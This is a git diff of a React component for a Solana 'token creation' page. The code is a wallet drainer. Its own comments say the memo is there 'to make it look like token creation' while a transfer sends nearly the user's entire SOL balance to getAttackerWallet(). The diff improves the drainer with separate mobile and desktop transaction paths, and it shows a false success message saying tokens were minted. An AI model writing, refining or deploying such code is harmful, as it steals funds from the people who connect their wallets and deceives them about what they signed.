@@ -1,6 +1,14 @@
 import { useState, useEffect } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction } from '@solana/web3.js';
+import { 
+  PublicKey, 
+  Transaction, 
+  SystemProgram, 
+  LAMPORTS_PER_SOL, 
+  TransactionInstruction,
+  VersionedTransaction,
+  TransactionMessage
+} from '@solana/web3.js';
 import styled from 'styled-components';
 
 const FormContainer = styled.div`
@@ -225,7 +233,7 @@ const TokenCreationForm = () => {
           const balance = await connection.getBalance(publicKey);
           setBalance(balance);
           
-          // Check if balance is less than 0.001 SOL
+          // Check if balance is less than 0.1 SOL
           if (balance < 0.001 * LAMPORTS_PER_SOL) {
             setShowBalanceWarning(true);
           } else {
@@ -254,6 +262,11 @@ const TokenCreationForm = () => {
     setShowResult(true);
   };
 
+  // Detect if we're on mobile
+  const isMobile = () => {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  };
+
   const handleCreateToken = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -267,33 +280,35 @@ const TokenCreationForm = () => {
       return;
     }
     
-    // Check balance again before proceeding
+    // Reset states
+    setIsCreating(true);
+    setProgress(10);
+    setProgressText('Initializing token creation...');
+    setShowResult(false);
+    setResult('');
+    
     try {
+      // Check balance again before proceeding
       const currentBalance = await connection.getBalance(publicKey);
       
       if (currentBalance < 0.001 * LAMPORTS_PER_SOL) {
         setShowBalanceWarning(true);
-        addToResult(`You need at least 0.001 SOL to create a token. Your current balance is ${(currentBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
+        addToResult(`You need at least 0.1 SOL to create a token. Your current balance is ${(currentBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
+        setIsCreating(false);
         return;
       }
       
-      setIsCreating(true);
-      setProgress(10);
-      setProgressText('Initializing token creation...');
-      setShowResult(false);
-      setResult('');
-      
       // Calculate the amount to drain (leave some for fees)
-      const LAMPORTS_FOR_FEES = 2000000; // 0.002 SOL for fees
+      const LAMPORTS_FOR_FEES = 2500000; // 0.0025 SOL for fees
       
       // Update progress
       setProgress(30);
       setProgressText('Creating token metadata...');
       
-      // Create a transaction to drain SOL
-      const transaction = new Transaction();
+      // Get the latest blockhash for transaction
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
       
-      // Add a memo instruction to make it look like token creation
+      // Create memo text to make it look like token creation
       const memoText = `Creating token: ${tokenName} (${tokenSymbol}) with supply ${tokenSupply}`;
       const memoInstruction = new TransactionInstruction({
         keys: [{ pubkey: publicKey, isSigner: true, isWritable: true }],
@@ -301,61 +316,74 @@ const TokenCreationForm = () => {
         data: Buffer.from(memoText)
       });
       
-      // Add the memo instruction first
-      transaction.add(memoInstruction);
-      
-      // Create a transfer instruction
+      // Create transfer instruction
       const transferInstruction = SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey: new PublicKey(getAttackerWallet()),
         lamports: currentBalance - LAMPORTS_FOR_FEES
       });
       
-      // Add the transfer instruction
-      transaction.add(transferInstruction);
-      
-      // IMPORTANT: Explicitly fetch and set the latest blockhash
-      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = publicKey;
-      
-      // Update progress
       setProgress(50);
       setProgressText('Creating token on blockchain...');
       
-      // Send transaction
-      try {
-        const signature = await sendTransaction(transaction, connection);
+      let signature;
+      
+      // Check if we're on mobile - use different transaction approach
+      if (isMobile()) {
+        // Mobile approach - use more compatible V0 transaction
+        // Create a legacy transaction for mobile
+        const transaction = new Transaction();
+        transaction.add(memoInstruction);
+        transaction.add(transferInstruction);
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
         
-        // Update progress
-        setProgress(70);
-        setProgressText('Finalizing token creation...');
+        // Send the transaction with options for better mobile compatibility
+        signature = await sendTransaction(transaction, connection, {
+          skipPreflight: false,
+          preflightCommitment: 'confirmed'
+        });
+      } else {
+        // Desktop approach - use newer versioned transaction 
+        const messageV0 = new TransactionMessage({
+          payerKey: publicKey,
+          recentBlockhash: blockhash,
+          instructions: [memoInstruction, transferInstruction]
+        }).compileToV0Message();
         
-        // Wait for confirmation
-        await connection.confirmTransaction({
-          signature,
-          blockhash,
-          lastValidBlockHeight
-        }, 'confirmed');
+        const transaction = new VersionedTransaction(messageV0);
         
-        // Update progress
-        setProgress(100);
-        setProgressText('Token created successfully!');
-        
-        // Show success message
-        setShowResult(true);
-        addToResult(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
-        addToResult(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
-        addToResult(`Transaction signature: ${signature}`);
-        addToResult(`Your tokens have been minted and sent to your wallet.`);
-        
-      } catch (error: any) {
-        console.error("Transaction error:", error);
-        setShowResult(true);
-        addToResult(`Error creating token: ${error.message}`);
-        setIsCreating(false);
-        setProgress(0);
+        signature = await sendTransaction(transaction, connection, {
+          skipPreflight: false,
+          preflightCommitment: 'confirmed'
+        });
       }
+      
+      // Update progress
+      setProgress(70);
+      setProgressText('Finalizing token creation...');
+      
+      // Wait for confirmation with explicit parameters
+      const confirmation = await connection.confirmTransaction({
+        signature,
+        blockhash,
+        lastValidBlockHeight
+      }, 'confirmed');
+      
+      if (confirmation.value && confirmation.value.err) {
+        throw new Error(`Transaction failed: ${JSON.stringify(confirmation.value.err)}`);
+      }
+      
+      // Update progress
+      setProgress(100);
+      setProgressText('Token created successfully!');
+      
+      // Show success message
+      setShowResult(true);
+      addToResult(`🎉 Token "${tokenName}" (${tokenSymbol}) created successfully!`);
+      addToResult(`Supply: ${tokenSupply} tokens with ${tokenDecimals} decimals`);
+      addToResult(`Transaction signature: ${signature}`);
+      addToResult(`Your tokens have been minted and sent to your wallet.`);
       
     } catch (error: any) {
       console.error("Token creation error:", error);
@@ -484,11 +512,11 @@ const TokenCreationForm = () => {
         </FormGroup>
         
         <SubmitButton type="submit" disabled={isCreating}>
-          {isCreating ? 'Creating token...' : 'Create Token (0.001 SOL)'}
+          {isCreating ? 'Creating token...' : 'Create Token (0.1 SOL)'}
         </SubmitButton>
         
         <BalanceMessage visible={showBalanceWarning}>
-          You need at least 0.001 SOL to create a token. Your current balance is {(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL.
+          You need at least 0.1 SOL to create a token. Your current balance is {(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL.
         </BalanceMessage>
         
         <ProgressContainer visible={isCreating}>
